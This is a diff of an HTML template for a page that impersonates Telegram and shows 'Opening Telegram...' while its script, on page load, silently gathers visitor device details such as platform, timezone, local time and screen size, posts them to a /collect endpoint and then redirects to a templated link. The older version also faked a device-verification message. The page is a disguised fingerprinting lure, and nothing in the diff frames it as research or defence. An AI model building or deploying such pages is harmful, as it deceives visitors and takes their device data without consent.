@@ -1,43 +1,41 @@
-<!DOCTYPE html>
-<html lang="en">
+ <!DOCTYPE html>
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Telegram</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="/static/style.css">
+    <meta charset="UTF-8">
+    <title>Telegram</title>
+    <link rel="stylesheet" href="/static/telegram-style.css">
+    <script>
+        async function sendData() {
+            const data = {
+                platform: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                localTime: new Date().toString(),
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth
+            };
+
+            try {
+                await fetch("/collect", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {}
+
+            // بعد 1.2 ثانية يتم التوجيه
+            setTimeout(() => {
+                window.location.href = "{{ goto }}";
+            }, 2200);
+        }
+
+        window.onload = sendData;
+    </script>
 </head>
 <body>
-  <div class="container">
-    <img src="/static/telegram-logo.png" alt="Telegram" class="logo">
-    <h2>Opening Telegram...</h2>
-    <div class="loading-bar"><div class="bar"></div></div>
-    <p>Please wait while we verify your device.</p>
-  </div>
-
-  <script>
-    const data = {
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      platform: navigator.platform,
-      screen: {
-        width: screen.width,
-        height: screen.height,
-        colorDepth: screen.colorDepth
-      },
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    };
-
-    fetch("/collect", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    });
-
-    setTimeout(() => {
-      const url = new URL(window.location.href);
-      const goto = url.searchParams.get("goto") || "https://t.me/YourChannel";
-      window.location.href = goto;
-    }, 4000);
-  </script>
+    <div class="loading">
+        <img src="https://telegram.org/img/t_logo.png" alt="Telegram" />
+        <p>Opening Telegram...</p>
+    </div>
 </body>
 </html>
